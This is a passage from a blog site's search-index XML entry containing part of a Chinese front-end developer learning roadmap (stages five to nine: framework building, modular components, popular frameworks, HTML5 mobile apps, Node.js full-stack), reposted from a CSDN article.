title="第五阶段：封装一个属于自己的框架"></a>第五阶段：封装一个属于自己的框架</h2><ul><li>框架封装基础：<br>事件流、冒泡、捕获、事件对象、事件框架、选择框架。</li><li>框架封装中级：<br>运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。</li><li>框架封装高级和补充：<br>JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。</li></ul><h2 id="第六阶段：模块化组件开发"><a href="#第六阶段：模块化组件开发" class="headerlink" title="第六阶段：模块化组件开发"></a>第六阶段：模块化组件开发</h2><ul><li>面向组件编程：<br>面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。</li><li>面向模块编程：<br>AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。</li></ul><h2 id="第七阶段：主流的流行框架"><a href="#第七阶段：主流的流行框架" class="headerlink" title="第七阶段：主流的流行框架"></a>第七阶段：主流的流行框架</h2><ul><li>Web开发工作流：<br>GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。</li><li>MVC/MVVM/MVW框架：<br>Angular.js、Backbone.js、Knockout/Ember。</li><li>常用库：<br>React.js、Vue.js、Zepto.js。</li></ul><h2 id="第八阶段：HTML5原生移动应用开发"><a href="#第八阶段：HTML5原生移动应用开发" class="headerlink" title="第八阶段：HTML5原生移动应用开发"></a>第八阶段：HTML5原生移动应用开发</h2><ul><li>Cordova：<br>WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。</li><li>Ionic：<br>Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。</li><li>React Native：<br>React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。</li><li>HTML5+：<br>HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。</li></ul><h2 id="第九阶段：Node-js全栈开发"><a href="#第九阶段：Node-js全栈开发" class="headerlink" title="第九阶段：Node.js全栈开发"></a>第九阶段：Node.js全栈开发</h2><ul><li>快速入门：<br>Node.js发展、生态圈、Io.js、Linux/Windows/OS X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。</li><li>核心模块和对象：<br>全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。</li><li>Web开发基础：<br>HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。</li><li>快速开发框架：<br>Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。</li><li>Node.js开发电子商务实战：<br>需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。</li></ul><p>转自:<a href="https://blog.csdn.net/u011047006/article/details/52597178" target="_blank" rel="noopener">https://blog.csdn.net/u011047006/article/details/52597178</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
